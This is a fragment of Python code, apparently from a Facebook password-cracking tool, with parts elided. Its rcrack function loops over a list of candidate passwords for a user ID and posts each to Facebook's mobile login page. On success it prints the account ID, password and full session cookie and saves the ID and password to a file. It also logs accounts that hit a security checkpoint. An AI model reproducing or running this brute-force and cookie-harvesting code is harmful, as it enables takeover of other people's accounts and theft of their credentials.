...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            'user-agent': pro,
            'viewport-width': '980',}
            loe = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = re.findall('c_user=(.*);xs', coki)[0]
                print(f'\033[1;96m  [\033[1;92m✔\033[1;96m]\033[1;92m '+uid+' \033[1;96m◉\033[1;92m '+ps+'')
                print(f'\033[1;97m  COOKIE : \033[1;37m'+coki)
                linex()
                open('/sdcard/WLO-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[82:97]
                print('\033[1;90m  [✘] '+uid+' ◉ '+ps+'') 
